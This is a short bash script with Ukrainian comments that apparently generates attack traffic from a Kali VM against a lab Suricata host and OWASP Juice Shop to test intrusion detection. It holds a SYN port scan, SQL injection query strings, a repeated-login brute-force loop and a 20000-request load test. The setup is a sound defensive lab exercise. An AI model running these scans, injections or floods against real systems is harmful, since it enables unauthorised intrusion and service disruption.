#!/usr/bin/env bash
# run-tests.sh
#
# Команди для відтворення всіх 6 тестових сценаріїв з проєкту.
# Виконуються з машини атакувальника (Kali Linux VM) проти
# CachyOS (Suricata) та OWASP Juice Shop.
#
# УВАГА: запускати лише у власному ізольованому лабораторному
# середовищі, ніколи проти сторонніх систем.

TARGET="192.168.0.209"
JUICE_SHOP="http://${TARGET}:3000"

echo "== 1. ICMP-запит =="
ping -c 10 "$TARGET"

echo "== 2. Сканування портів (SYN scan) =="
sudo nmap -sS -Pn -T4 "$TARGET"

echo "== 3. Спроба SSH-підключення =="
ssh "user@${TARGET}"

echo "== 4. SQL-injection запити =="
curl "${JUICE_SHOP}/rest/products/search?q=%27%20OR%201%3D1--"
curl "${JUICE_SHOP}/rest/products/search?q=union%20select"

echo "== 5. Імітація brute force (багаторазові login-запити) =="
for i in {1..20}; do
  curl -s -X POST "${JUICE_SHOP}/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrongpass"}'
done

echo "== 6. HTTP-навантаження (ApacheBench) =="
ab -n 20000 -c 100 "${JUICE_SHOP}/"

echo "Готово. Перевір /var/log/suricata/fast.log на CachyOS."
